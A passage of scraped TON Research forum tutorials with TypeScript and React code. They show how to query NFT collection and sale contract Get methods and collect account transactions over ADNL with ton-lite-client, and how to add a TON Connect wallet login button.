import { LiteClient, LiteRoundRobinEngine, LiteSingleEngine, LiteEngine } from "ton-lite-client";
import { Address} from "ton-core";

async function main() {
	const engines: LiteEngine[] = [];
	engines.push(new LiteSingleEngine({
		host: `tcp://${intToIP(server.ip)}:${server.port}`,
		publicKey: Buffer.from(server.id.key, 'base64'),
	}));
	const engine: LiteEngine = new LiteRoundRobinEngine(engines);
	const client = new LiteClient({ engine });
	const master = await client.getMasterchainInfo()

}
```

Take the address of any collection in TON, for example `EQAo92DYMokxghKcq-CkCGSk_MgXY5Fo1SPW20gkvZl75iCN` and call its Get method using the resulting block:

```
let executed = await client.runMethod(Address.parse(addrStr), 'get_collection_data', Buffer.alloc(0), master.last);
if (!executed.result) {
	return
}
```

Get methods can take parameters, since there are no parameters in the standard `get_collection_data` method, we pass `Buffer.alloc(0)` - an object of zero size.

In response, we will receive a stack that needs to be parsed, it will look like this:

```
	// collection
const addrStr="EQAo92DYMokxghKcq-CkCGSk_MgXY5Fo1SPW20gkvZl75iCN";
let executed = await client.runMethod(Address.parse(addrStr), 'get_collection_data', Buffer.alloc(0), master.last);
if (!executed.result) {
	return
}
let resultTuple = parseTuple(Cell.fromBoc(Buffer.from(executed.result, 'base64'))[0])
let parsed = new TupleReader(resultTuple);
```

Now we can start reading data, such as the index of the next element in the collection:

```
let next_item_index = parsed.readBigNumber();
```

As well as the address of the owner and the cell with the content:

```
let collection_content = parsed.readCell();
let owner_address = parsed.readAddress();
```

If you output data to the console, you will see the value, address and cell, the cell contains content, the storage of this content is also described by the standard, data storage is described here in the `Content representation` paragraph, the data is here.

The most common data representation is `Offchain snake format`, let’s parse it:

```
import { LiteClient, LiteRoundRobinEngine, LiteSingleEngine, LiteEngine } from "ton-lite-client";
import { Address, Cell, loadTransaction,parseTuple, TupleReader, beginCell  } from "ton-core";
import { Buffer } from 'buffer';

function intToIP(int: number) {
	var part1 = int & 255;
	var part2 = ((int >> 8) & 255);
	var part3 = ((int >> 16) & 255);
	var part4 = ((int >> 24) & 255);

	return part4 + "." + part3 + "." + part2 + "." + part1;
}

let server = {
	"ip": -2018145068,
	"port": 13206,
	"id": {
		"@type": "pub.ed25519",
		"key": "K0t3+IWLOXHYMvMcrGZDPs+pn58a17LFbnXoQkKc2xw="
	}
}

		//int 0x46495850,    ;; fix price sale ("FIXP")
		//int is_complete 
		//int created_at
		//slice marketplace_address
		//slice nft_address
		//slice nft_owner_address
		//int full_price
		//slice marketplace_fee_address
		//int marketplace_fee
		//slice royalty_address
		//int royalty_amount


const OFF_CHAIN_CONTENT_PREFIX = 0x01

export function flattenSnakeCell(cell: Cell) {
  let c: Cell | null = cell

  let res = Buffer.alloc(0)

  while (c) {
	const cs = c.beginParse()
	if (cs.remainingBits === 0) {
	  return res
	}
	if (cs.remainingBits % 8 !== 0) {
	  throw Error('Number remaining of bits is not multiply of 8')
	}

	const data = cs.loadBuffer(cs.remainingBits / 8)
	res = Buffer.concat([res, data])
	c = c.refs && c.refs[0]
  }

  return res
}

export function decodeOffChainContent(content: Cell) {
  const data = flattenSnakeCell(content)

  const prefix = data[0]
  if (prefix !== OFF_CHAIN_CONTENT_PREFIX) {
	throw new Error(`Unknown content prefix: ${prefix.toString(16)}`)
  }
  return data.slice(1).toString()
}

async function main() {
	const engines: LiteEngine[] = [];
	engines.push(new LiteSingleEngine({
		host: `tcp://${intToIP(server.ip)}:${server.port}`,
		publicKey: Buffer.from(server.id.key, 'base64'),
	}));
	const engine: LiteEngine = new LiteRoundRobinEngine(engines);
	const client = new LiteClient({ engine });
	const master = await client.getMasterchainInfo()


		//GET METHOD

		// collection
	const addrStr="EQAo92DYMokxghKcq-CkCGSk_MgXY5Fo1SPW20gkvZl75iCN";
	let executed = await client.runMethod(Address.parse(addrStr), 'get_collection_data', Buffer.alloc(0), master.last);
	if (!executed.result) {
		return
	}
	let resultTuple = parseTuple(Cell.fromBoc(Buffer.from(executed.result, 'base64'))[0])
	let parsed = new TupleReader(resultTuple);
	//(int next_item_index, cell collection_content, slice owner_address)
	//console.log(parsed);
	let next_item_index = parsed.readBigNumber();
	let collection_content = parsed.readCell();
	let owner_address = parsed.readAddress();
	console.log("Content link: " ,decodeOffChainContent(collection_content));
	console.log("Owner Address: ", owner_address);

}

main()
```

The `decodeOffChainContent()` function checks by prefix that this is off-chain content storage and ‘parses’ the cell, turning it into the link we need.

## [](#sales-information-data-collection-logic-4)Sales information - data collection logic

Understanding how smart contracts work, you can get almost any information from the network. In TON, the actor model, respectively, in order to understand where to get information, you need to understand the chain of smart contracts.

Let’s imagine a certain task and try to consider the chain. Let’s say we want to analyze the latest sales occurring on the NFT marketplace. Then, roughly understanding how NFT sales in TON work (analysis of smart contracts here), we:

consider the NFT element available to us and analyze how the transfer of ownership of this element occurs using the explorer  
consider a marketplace smart contract or other smart contract that receives sales messages - this will give us a list of recent sales  
let’s analyze what types of smart contracts implement sales - you can sell by auction, simply putting it up for sale or, for example, making an offer to sell to the owner of the NFT  
let’s look at each type of GET methods, i.e. what information is returned by smart sales contracts  
from GET methods we will get information about NFT, which means we will have to get information about specific elements, for this we need to understand how the standard works  
Let’s try to go this way for the Getgems marketplace, take some NFT and, moving from it, try to find the information we need.

We find on the marketplace some NFT that has already been sold:

![](https://tonscan.org/favicon.svg) [Tonscan](https://tonscan.org/address/EQCSfecskd3PuZJ_eBa1VogJ-okmoIaUOpnWTDdqNpe2OPl7)

### [Tonscan — Explore TON blockchain ecosystem](https://tonscan.org/address/EQCSfecskd3PuZJ_eBa1VogJ-okmoIaUOpnWTDdqNpe2OPl7)

Discover The Open Network ecosystem with tonscan.org — the simplest way to track transaction history, whales addresses, DApps, network stats, staking pools and more.

Let’s look at the transaction history, we see that there is a transaction from the collection - i.e. NFT deployment and there is a smart contract for sale:

![](https://tonscan.org/favicon.svg) [Tonscan](https://tonscan.org/address/EQCd205E1KdajfW29w7BRyWhiOZwZSPbirMathS8CaTEO83e)

### [Tonscan — Explore TON blockchain ecosystem](https://tonscan.org/address/EQCd205E1KdajfW29w7BRyWhiOZwZSPbirMathS8CaTEO83e)

Discover The Open Network ecosystem with tonscan.org — the simplest way to track transaction history, whales addresses, DApps, network stats, staking pools and more.

If we consider the sales smart contract, it becomes clear that, according to its logic, the last transaction goes to the marketplace smart contract, namely here:

![](https://tonscan.org/favicon.svg) [Tonscan](https://tonscan.org/address/EQCjk1hh952vWaE9bRguFkAhDAL5jj3xj9p0uPWrFBq_GEMS)

### [Tonscan — Explore TON blockchain ecosystem](https://tonscan.org/address/EQCjk1hh952vWaE9bRguFkAhDAL5jj3xj9p0uPWrFBq_GEMS)

Discover The Open Network ecosystem with tonscan.org — the simplest way to track transaction history, whales addresses, DApps, network stats, staking pools and more.

Now we have a hypothesis that if we take the transactions of this smart contract, we will be able to receive information about sales, but we remember that sales are different, by climbing the smart contract of the marketplace, we will find:

Sales example: [Tonscan — Explore TON blockchain ecosystem](https://tonscan.org/address/EQCd205E1KdajfW29w7BRyWhiOZwZSPbirMathS8CaTEO83e)  
Sales proposals, example: [Tonscan — Explore TON blockchain ecosystem](https://tonscan.org/address/EQBikL59x3fXgG4CYXTZBiCHiBhLOHp1cYKL4bBqTRL-5ywu)  
Auction sales example: [Tonscan — Explore TON blockchain ecosystem](https://tonscan.org/address/EQBLQRjs7unG_ruz3Ismly_3_aXFD_wthmbTSUtdh6te4B1e)  
Let’s explore the Get methods of smart contract data by looking at the Contract tab in the explorer. We see that for regular sales and auctions, there is a get\_nft\_data() method.

For sales:

```
(int, int, int, slice, slice, slice, int, slice, int, slice, int) get_sale_data() method_id {
	var (
		is_complete,
		created_at,
		marketplace_address,
		nft_address,
		nft_owner_address,
		full_price,
		fees_cell
	) = load_data();

	var (
		marketplace_fee_address,
		marketplace_fee,
		royalty_address,
		royalty_amount
	) = load_fees(fees_cell);

	return (
		0x46495850,    ;; fix price sale ("FIXP")
		is_complete == 1,
		created_at,
		marketplace_address,
		nft_address,
		nft_owner_address,
		full_price,
		marketplace_fee_address,
		marketplace_fee,
		royalty_address,
		royalty_amount
	);
}
```

For auctions:

```
; 1  2    3    4      5      6      7    8      9    10     11   12   13     14   15   16   17   18   19   20
(int, int, int, slice, slice, slice, int, slice, int, slice, int, int, slice, int, int, int, int, int, int, int) get_sale_data() method_id {
	init_data();

	var (
			mp_fee_addr,
			mp_fee_factor,
			mp_fee_base,
			royalty_fee_addr,
			royalty_fee_factor,
			royalty_fee_base
	) = get_fees();

	return (
			0x415543, ;; 1 nft aucion ("AUC")
			end?, ;; 2
			end_time, ;; 3
			mp_addr, ;; 4
			nft_addr, ;; 5
			nft_owner, ;; 6
			last_bid, ;; 7
			last_member, ;; 8
			min_step, ;; 9
			mp_fee_addr, ;; 10
			mp_fee_factor, mp_fee_base, ;; 11, 12
			royalty_fee_addr, ;; 13
			royalty_fee_factor, royalty_fee_base, ;; 14, 15
			max_bid, ;; 16
			min_bid, ;; 17
			created_at?, ;; 18
			last_bid_at, ;; 19
			is_canceled? ;; 20
	);
}
```

Notice the first variables that return the same methods, which means that in order to get information about which item was sold, we will need to make the same request for these two types. For offers, the situation is different, there is a `get_offer_data()` method.

```
(int, int, int, int, slice, slice, slice, int, slice, int, int, slice, int, int, int) get_offer_data() method_id {
	var (
			is_complete,
			created_at, finish_at,
			marketplace_address,
			nft_address,
			offer_owner_address,
			full_price,
			fees_cell,
			can_deploy
	) = load_data();

	var (
			marketplace_fee_address,
			marketplace_factor, marketplace_base,
			royalty_address,
			royalty_factor, royalty_base
	) = load_fees(fees_cell);

	int royalty_amount = get_percent(full_price, royalty_factor, royalty_base);
	int marketplace_fee = get_percent(full_price, marketplace_factor, marketplace_base);
	int profit_price = full_price - royalty_amount - marketplace_fee;

	return (
			0x4f46464552,    ;; offer ("OFFER")
			is_complete == 1,
			created_at, finish_at,
			marketplace_address,
			nft_address,
			offer_owner_address,
			full_price,
			marketplace_fee_address,
			marketplace_factor, marketplace_base,
			royalty_address,
			royalty_factor, royalty_base,
			profit_price
	);
}
```

From these methods, we can get the address of the collection, the address of the element, and the price at which the sale took place. Now, having studied the standards, we can get information about the items that were sold.

It will look like this, first we make a request to the `get_nft_data()` element, we get the individual cell content and the element index. Now we go to the smart contract of the collection, there we need the `get_nft_content(int index, cell individual_content)` method, which will return the cell with the content to us.

## [](#conclusion-5)Conclusion

We know how to make Get-requests and get content through ADNL, it remains only to learn how to get transactions - we will do this in the next tutorial.

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/requests/ADNL/adnlgetsale.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/requests/ADNL/adnlgetsale.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/requests/ADNL/adnlgetsale.md)

````
# Get method via ADNL

## Introduction

A common task in TON is to get data from smart contracts via Get methods. In this tutorial, we will get the data about the NFT collection through the Get method of the collection smart contract. We will also talk about the logic of selling NFTs in TON and how to get information about the sale correctly.

## Introduction

Since the collection smart contract is a standard, we can look at the method signature. `get_collection_data()` returns:

- `next_item_index` is the number of currently deployed NFT items in the collection.
- `collection_content` - collection content in TEP-64 format.
- `owner_address` - address of the owner of the collection, zero address if there is no owner.

In order to make a request, you need the last block, we analyzed how to get it in the previous tutorial:
```ts
import { LiteClient, LiteRoundRobinEngine, LiteSingleEngine, LiteEngine } from "ton-lite-client";
import { Address} from "ton-core";

async function main() {
````

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/requests/ADNL/adnlgetsale.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 445

[TON Research](/)

# [Get requests in TON - Lesson 4 Collect account txes using ADNL](/t/get-requests-in-ton-lesson-4-collect-account-txes-using-adnl/445)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)  February 21, 2024, 2:26pm  1

# [](#collect-recent-transactions-1)Collect recent transactions

A common task in TON is to receive transactions of any account. In this tutorial, we will see how to get account transactions using ADNL

## [](#logical-transaction-time-2)Logical transaction time

The `ton-lite-client` library has a `getAccountTransactions` function to get account transactions, the problem is that the filter is based on the logical time of the transaction. Accordingly, in order to get the latest transactions, you first need to get it. We do this with `getAccountState()`:

```
import { LiteClient, LiteRoundRobinEngine, LiteSingleEngine, LiteEngine } from "ton-lite-client";
import { Address, Cell, loadTransaction,parseTuple, TupleReader, beginCell  } from "ton-core";
import { Buffer } from 'buffer';

function intToIP(int: number) {
	var part1 = int & 255;
	var part2 = ((int >> 8) & 255);
	var part3 = ((int >> 16) & 255);
	var part4 = ((int >> 24) & 255);

	return part4 + "." + part3 + "." + part2 + "." + part1;
}

let server = {
	"ip": -2018145068,
	"port": 13206,
	"id": {
		"@type": "pub.ed25519",
		"key": "K0t3+IWLOXHYMvMcrGZDPs+pn58a17LFbnXoQkKc2xw="
	}
}

async function main() {
	const engines: LiteEngine[] = [];
	engines.push(new LiteSingleEngine({
		host: `tcp://${intToIP(server.ip)}:${server.port}`,
		publicKey: Buffer.from(server.id.key, 'base64'),
	}));
	const engine: LiteEngine = new LiteRoundRobinEngine(engines);
	const client = new LiteClient({ engine });
	const master = await client.getMasterchainInfo()

	//transactions
	const address = Address.parse('EQCjk1hh952vWaE9bRguFkAhDAL5jj3xj9p0uPWrFBq_GEMS');
	const accountState = await client.getAccountState(address, master.last)
	if (!accountState.lastTx) {
		return
	}

}

main()
```

It’s simple - we take the last block, and from it we get information about the account. From this information, we will get the logical time of the last transaction and using the auxiliary function `bigIntToBuffer()` we will present the hash in the format we need further:

```
let lastTxLt = accountState.lastTx.lt.toString()
let lastTxHash = bigIntToBuffer(accountState.lastTx.hash)
```

We call the method and get a cell with transactions:

```
let lastTxLt = accountState.lastTx.lt.toString()
let lastTxHash = bigIntToBuffer(accountState.lastTx.hash)
	
let limit = 16 as number 
const temp = await client.getAccountTransactions(address,lastTxLt,lastTxHash,limit)
```

Let’s use the `loadTransction` function from `ton-core` and use logical time to represent transactions in a convenient form:

```
let lastTxLt = accountState.lastTx.lt.toString()
let lastTxHash = bigIntToBuffer(accountState.lastTx.hash)
	
let limit = 16 as number 
const temp = await client.getAccountTransactions(address,lastTxLt,lastTxHash,limit)
	
console.log(temp);
	
const cell = Cell.fromBoc(temp.transactions)
const ltToHash: Map<string, Buffer> = new Map()
	ltToHash.set(lastTxLt, lastTxHash)

const transactions = cell.map((c) => {
	const tx = loadTransaction(c.beginParse())
	ltToHash.set(tx.prevTransactionLt.toString(), bigIntToBuffer(tx.prevTransactionHash))
	return tx
})
```

## [](#loops-and-transactions-3)Loops and Transactions

Now we can loop through the transactions. Let’s do this - we will get the information and present it in a convenient form, the information is as follows:

```
export interface PlainTransaction {
  address: string // raw
  lt: string // bigint
  hash: string // base64
  data: string // base64

  prevLt: string
  prevHash: string
}
```

We present it in a convenient way:

```
let lastTxLt = accountState.lastTx.lt.toString()
let lastTxHash = bigIntToBuffer(accountState.lastTx.hash)
	
let limit = 16 as number 
const temp = await client.getAccountTransactions(address,lastTxLt,lastTxHash,limit)
	
console.log(temp);
	
const cell = Cell.fromBoc(temp.transactions)
const ltToHash: Map<string, Buffer> = new Map()
	ltToHash.set(lastTxLt, lastTxHash)

const transactions = cell.map((c) => {
	const tx = loadTransaction(c.beginParse())
	ltToHash.set(tx.prevTransactionLt.toString(), bigIntToBuffer(tx.prevTransactionHash))
	return tx
})
	
const txes = transactions.map((tx, i): PlainTransaction => {
	const lt = tx.lt.toString()
	const hash = ltToHash.get(lt)

	if (!hash) {
		throw new Error('Tx hash not found')
	}

	return Object.freeze({
		address: address.toString(),
		lt,
		hash: hash.toString('hex'),
		data: cell[i].toBoc().toString('base64'),
		prevLt: tx.prevTransactionLt.toString(),
		prevHash: bigIntToBuffer(tx.prevTransactionHash).toString('hex'),
	})
})
```

Next, let’s look at information about transactions, but in order to view the message sent with the transaction, we need one more helper function:

```
export function msgToStr(msg: Cell | undefined){
  if (!msg) {
	return
  }
  const body = msg.asSlice()
  if (body.remainingBits < 32) {
	return undefined
  }
  const opcode = body.loadUint(32)
  if (opcode !== 0) {
	return 'OP: 0x' + opcode.toString(16)
  }
  if (body.remainingBits < 8 || body.remainingBits % 8 !== 0) {
	return undefined
  }
  //console.log('body.remainingBits', body.remainingBits)
  return body.loadBuffer(body.remainingBits / 8).toString('utf-8')
}
```

## [](#make-it-readable-4)Make it readable

For example, let’s get information on transactions and present them in a convenient, readable form:

```
import { LiteClient, LiteRoundRobinEngine, LiteSingleEngine, LiteEngine } from "ton-lite-client";
import { Address, Cell, loadTransaction,parseTuple, TupleReader, beginCell  } from "ton-core";
import { Buffer } from 'buffer';

function intToIP(int: number) {
	var part1 = int & 255;
	var part2 = ((int >> 8) & 255);
	var part3 = ((int >> 16) & 255);
	var part4 = ((int >> 24) & 255);

	return part4 + "." + part3 + "." + part2 + "." + part1;
}

let server = {
	"ip": -2018145068,
	"port": 13206,
	"id": {
		"@type": "pub.ed25519",
		"key": "K0t3+IWLOXHYMvMcrGZDPs+pn58a17LFbnXoQkKc2xw="
	}
}

//for transaction
export function bigIntToBuffer(data: bigint | undefined) {
  if (!data) {
	return Buffer.from([])
  }
  const hexStr = data.toString(16)
  const pad = hexStr.padStart(64)
  const hashHex = Buffer.from(pad, 'hex')

  return hashHex
}

export interface PlainTransaction {
  address: string // raw
  lt: string // bigint
  hash: string // base64
  data: string // base64

  prevLt: string
  prevHash: string
}



export function msgToStr(msg: Cell | undefined){
  if (!msg) {
	return
  }
  const body = msg.asSlice()
  if (body.remainingBits < 32) {
	return undefined
  }
  const opcode = body.loadUint(32)
  if (opcode !== 0) {
	return 'OP: 0x' + opcode.toString(16)
  }
  if (body.remainingBits < 8 || body.remainingBits % 8 !== 0) {
	return undefined
  }
  //console.log('body.remainingBits', body.remainingBits)
  return body.loadBuffer(body.remainingBits / 8).toString('utf-8')
}

async function main() {
	const engines: LiteEngine[] = [];
	engines.push(new LiteSingleEngine({
		host: `tcp://${intToIP(server.ip)}:${server.port}`,
		publicKey: Buffer.from(server.id.key, 'base64'),
	}));
	const engine: LiteEngine = new LiteRoundRobinEngine(engines);
	const client = new LiteClient({ engine });
	const master = await client.getMasterchainInfo()


	//transactions
	const address = Address.parse('EQCjk1hh952vWaE9bRguFkAhDAL5jj3xj9p0uPWrFBq_GEMS');
	const accountState = await client.getAccountState(address, master.last)
	if (!accountState.lastTx) {
		return
	}

	let lastTxLt = accountState.lastTx.lt.toString()
	let lastTxHash = bigIntToBuffer(accountState.lastTx.hash)

	let limit = 16 as number 
	const temp = await client.getAccountTransactions(address,lastTxLt,lastTxHash,limit)

	console.log(temp);

	const cell = Cell.fromBoc(temp.transactions)
	const ltToHash: Map<string, Buffer> = new Map()
		ltToHash.set(lastTxLt, lastTxHash)

	const transactions = cell.map((c) => {
		const tx = loadTransaction(c.beginParse())
		ltToHash.set(tx.prevTransactionLt.toString(), bigIntToBuffer(tx.prevTransactionHash))
		return tx
	})

	const txes = transactions.map((tx, i): PlainTransaction => {
		const lt = tx.lt.toString()
		const hash = ltToHash.get(lt)

		if (!hash) {
			throw new Error('Tx hash not found')
		}

		return Object.freeze({
			address: address.toString(),
			lt,
			hash: hash.toString('hex'),
			data: cell[i].toBoc().toString('base64'),
			prevLt: tx.prevTransactionLt.toString(),
			prevHash: bigIntToBuffer(tx.prevTransactionHash).toString('hex'),
		})
	})


	for (const transaction of txes) {
		const txCell = Cell.fromBoc(Buffer.from(transaction.data, 'base64'))[0]
		const data = loadTransaction(txCell.asSlice())
		console.log("Type: ",data.inMessage?.info.type); //external and internal
		console.log("Addr: ",data.inMessage?.info.src);  // from who tx
		console.log("Msg: ", msgToStr(data.inMessage?.body));
		console.log("Date",new Date(data.now*1000));
	}		

	/*
	const lastTx = txes.at(-1)
		if (lastTx) {
		  const lastTxData = loadTransaction(
			Cell.fromBoc(Buffer.from(lastTx.data, 'base64'))[0].asSlice()
		  )

		  lastTxLt = lastTxData.prevTransactionLt.toString()
		  lastTxHash = bigIntToBuffer(lastTxData.prevTransactionHash)
		}
	*/
	//console.log(txes);

}

main()
```

At the end you can see a commented piece of code, you may need it if you want to pull out more than 16 transactions at a time, since the `getAccountTransactions` function pulls out a maximum of 16, which means you need to call it in a loop and get the logical time of the last transaction each time if you want more than 16 transactions.

## [](#conclusion-5)Conclusion

This article is the last in the cycle about ADNL, I hope you liked it and you will put an asterisk on the repository. More useful articles about TON [here](https://t.me/ton_learn).

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/requests/ADNL/adnltxes.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/requests/ADNL/adnltxes.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/requests/ADNL/adnltxes.md)

````
# Collect recent transactions

A common task in TON is to receive transactions of any account. In this tutorial, we will see how to get account transactions using ADNL

## Logical transaction time

The `ton-lite-client` library has a `getAccountTransactions` function to get account transactions, the problem is that the filter is based on the logical time of the transaction. Accordingly, in order to get the latest transactions, you first need to get it. We do this with `getAccountState()`:

```ts
import { LiteClient, LiteRoundRobinEngine, LiteSingleEngine, LiteEngine } from "ton-lite-client";
import { Address, Cell, loadTransaction,parseTuple, TupleReader, beginCell  } from "ton-core";
import { Buffer } from 'buffer';

function intToIP(int: number) {
	var part1 = int & 255;
	var part2 = ((int >> 8) & 255);
	var part3 = ((int >> 16) & 255);
	var part4 = ((int >> 24) & 255);

	return part4 + "." + part3 + "." + part2 + "." + part1;
````

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/requests/ADNL/adnltxes.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 446

[TON Research](/)

# [Authorize and send transactions effortlessly with TON Connect React UI - Lesson 1 TON Connect auth button](/t/authorize-and-send-transactions-effortlessly-with-ton-connect-react-ui-lesson-1-ton-connect-auth-button/446)

[General](/c/general/4) 

[learn](https://tonresear.ch/tag/learn)

    

[Simpson](https://tonresear.ch/u/Simpson)   February 21, 2024, 2:29pm  1

TonConnect UI React is a React UI kit for the TonConnect SDK. Use it to connect your app to TON wallets via the TonConnect protocol in React apps.

Using TonConnect UI React will allow you to quickly create authorization and applications on TON.

### [](#tonkeeper-1)Tonkeeper

In order to use it, you need a TON wallet, link to TONkeeper: [https://tonkeeper.com/](https://tonkeeper.com/)

## [](#install-dependencies-2)Install dependencies

Make a folder for your project and go into it.

```
// Windows example
mkdir tcon_folder
cd tcon_folder
```

Before you begin, `Node` and `yarn` must be installed on your system. In our tutorial, we will use `vite` - a development environment setup tool. With it, we would make an application template:

```
yarn create vite react_ui_connect --template react-ts
```

Let’s go to the project folder:

```
cd react_ui_connect
```

Install “basic” dependencies:

```
yarn
```

To work with TON, we need:

```
yarn add ton ton-core ton-crypto
```

If you call the ton libraries right now (for example, convert the address and display it to the user), then you will see the Buffer is not defined error. To get around this problem, install:

```
yarn add vite-plugin-node-polyfills
```

You need this to solve the polyfill problem, and to solve it, you need to configure the `vite` config. Open `vite.config.ts` and see the template settings:

```
import { defineConfig } from 'vite'
import react from '@vitejs/plugin-react'

// https://vitejs.dev/config/
export default defineConfig({
	plugins: [react()],
})
```

Add `vite-plugin-node-polyfills` to it:

```
import { defineConfig } from 'vite'
import react from '@vitejs/plugin-react'
import { nodePolyfills } from "vite-plugin-node-polyfills";

// https://vitejs.dev/config/
export default defineConfig({
	plugins: [react(),nodePolyfills()],
})
```

It remains to install `TON Connect react-ui`:

```
yarn add @tonconnect/ui-react
```

## [](#manifest-3)Manifest

When a user connects to the application, via `TON Connect`, the wallet shows the user the connection information - where the user is connecting. To transfer this information from the application to `TON Connect`, you need to make a manifest file, which we will transfer when creating a connection, between our application and the wallet.

Parameters or otherwise metadata has the following fields:

```
{
  "url": "<app-url>",                        // required
  "name": "<app-name>",                      // required
  "iconUrl": "<app-icon-url>",               // required
  "termsOfUseUrl": "<terms-of-use-url>",     // optional
  "privacyPolicyUrl": "<privacy-policy-url>" // optional
}
```

It is good practice to place the manifest with metadata in the root of your application, but you can also place it on github.

For example, let’s take a link to the github from the repository with an example:

```
	const manifestUrl = 'https://gist.githubusercontent.com/siandreev/75f1a2ccf2f3b4e2771f6089aeb06d7f/raw/d4986344010ec7a2d1cc8a2a9baa57de37aaccb8/gistfile1.txt';
```

When we have the manifest ready, we can proceed to the connection.

## [](#connection-4)Connection

Open the file `src\main.tsx` and import `TonConnectUIProvider` into it:

```
import React from 'react'
import ReactDOM from 'react-dom/client'
import App from './App.tsx'
import './index.css'
import {TonConnectUIProvider} from "@tonconnect/ui-react"

ReactDOM.createRoot(document.getElementById('root') as HTMLElement).render(
  <React.StrictMode>
	<App />
  </React.StrictMode>,
)
```

Let’s add a manifest:

```
import React from 'react'
import ReactDOM from 'react-dom/client'
import App from './App.tsx'
import './index.css'
import {TonConnectUIProvider} from "@tonconnect/ui-react"

const manifestUrl = 'https://gist.githubusercontent.com/siandreev/75f1a2ccf2f3b4e2771f6089aeb06d7f/raw/d4986344010ec7a2d1cc8a2a9baa57de37aaccb8/gistfile1.txt';

ReactDOM.createRoot(document.getElementById('root') as HTMLElement).render(
  <React.StrictMode>
	<App />
  </React.StrictMode>,
)
```

To create a connection, we need to wrap our application in `TonConnectUIProvider`, it might look like this:

```
//import React from 'react'
import ReactDOM from 'react-dom/client'
import App from './App.tsx'
import './index.css'
import {TonConnectUIProvider} from "@tonconnect/ui-react"

const manifestUrl = 'https://gist.githubusercontent.com/siandreev/75f1a2ccf2f3b4e2771f6089aeb06d7f/raw/d4986344010ec7a2d1cc8a2a9baa57de37aaccb8/gistfile1.txt';

ReactDOM.createRoot(document.getElementById('root') as HTMLElement).render(
    <TonConnectUIProvider manifestUrl={manifestUrl}>
	<App />
  </TonConnectUIProvider>
)
```

Now we have a connection, we will use it for the authorization button.

## [](#login-button-5)Login button

Go to the `App.tsx` file and remove everything unnecessary inside the first `div` and remove the extra logo from the import:

```
import { useState } from 'react'
import './App.css'

function App() {
  const [count, setCount] = useState(0)

  return (
	<>
	</>
  )
}

export default App
```

To create an authorization button, we will use `TonConnect Button`. `TonConnect Button` is a universal UI component for initializing connection. After wallet is connected it transforms to a wallet menu. Importing the component:

```
import { useState } from 'react'
import './App.css'
import { TonConnectButton } from '@tonconnect/ui-react'

function App() {
  const [count, setCount] = useState(0)

  return (
	<>

	</>
  )
}

export default App
```

Since it’s a component, we can just call it inside a function:

```
import { useState } from 'react'
import './App.css'
import { TonConnectButton } from '@tonconnect/ui-react'


function App() {
  const [count, setCount] = useState(0)

  return (
	<>
	  <TonConnectButton/>
	</>
  )
}

export default App
```

Run the application with the `yarn dev` command. And enter the link in the browser. Must see:

[![image](https://tonresear.ch/uploads/default/optimized/1X/b73a380a920d70940bd373507d4f1c9787b4d421_2_690x353.png)

image1918×982 8.79 KB

](https://tonresear.ch/uploads/default/original/1X/b73a380a920d70940bd373507d4f1c9787b4d421.png "image")

Click on the button and you will see a QR and the ability to select a wallet:

[![image](https://tonresear.ch/uploads/default/optimized/1X/7f040f8083aced5cea12c03face281addc2f5d5b_2_690x359.png)

image1920×999 41.3 KB

](https://tonresear.ch/uploads/default/original/1X/7f040f8083aced5cea12c03face281addc2f5d5b.png "image")

Select Tonkeeper in wallets tab, QR will change:

[![image](https://tonresear.ch/uploads/default/optimized/1X/f57ce5f920751e3a9ded228a9b885733fae8eefb_2_690x357.png)

image1915×992 43.2 KB

](https://tonresear.ch/uploads/default/original/1X/f57ce5f920751e3a9ded228a9b885733fae8eefb.png "image")

We log in using Tonkeeper, the button will change and will display your address. In the drop-down list there will be a disconnect button and the ability to copy the address.

[![image](https://tonresear.ch/uploads/default/optimized/1X/fdb3ea5e2e6b8f3fbbc38c1ce55288cfc2935cc8_2_690x358.png)

image1904×989 19.5 KB

](https://tonresear.ch/uploads/default/original/1X/fdb3ea5e2e6b8f3fbbc38c1ce55288cfc2935cc8.png "image")

And all this with the help of one component, which we added with one line of code. In the next tutorial, we will figure out how to interact with smart contracts after authorization by sending transactions.

## [](#conclusion-6)Conclusion

In the next part, we will add a transaction submission, as well as a call to the Get method, to verify that the transaction has been submitted. I write similar tutorials and analyzes on the TON network in my channel - [Telegram: Contact @ton\_learn](https://t.me/ton_learn) . I will be glad to your subscription.

[github.com](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/tonconnect/button.md)

#### [romanovichim/TonFunClessons\_Eng/blob/main/lessons/tonconnect/button.md](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/tonconnect/button.md)

````
# Ton Connect React UI Authorization Button

TonConnect UI React is a React UI kit for the TonConnect SDK. Use it to connect your app to TON wallets via the TonConnect protocol in React apps.

Using TonConnect UI React will allow you to quickly create authorization and applications on TON.

### Tonkeeper

In order to use it, you need a TON wallet, link to TONkeeper: https://tonkeeper.com/

## Install dependencies

Make a folder for your project and go into it.
```bash
// Windows example
mkdir tcon_folder
cd tcon_folder
```
Before you begin, `Node` and `yarn` must be installed on your system. In our tutorial, we will use `vite` - a development environment setup tool. With it, we would make an application template:
```bash
````

This file has been truncated. [show original](https://github.com/romanovichim/TonFunClessons_Eng/blob/main/lessons/tonconnect/button.md)

 

*   [Home](/)
*   [Categories](/categories)
*   [Guidelines](/guidelines)

Powered by [Discourse](https://www.discourse.org), best viewed with JavaScript enabled



## Topic: 447

[TON Research](/)

# [Authorize and send transactions effortlessly with TON Connect React UI - Lesson 2 Ton Connect React ui send transaction](/t/authorize-and-send-transactions-effortlessly-with-ton-connect-react-ui-lesson-2-ton-connect-react-ui-send-transaction/447)

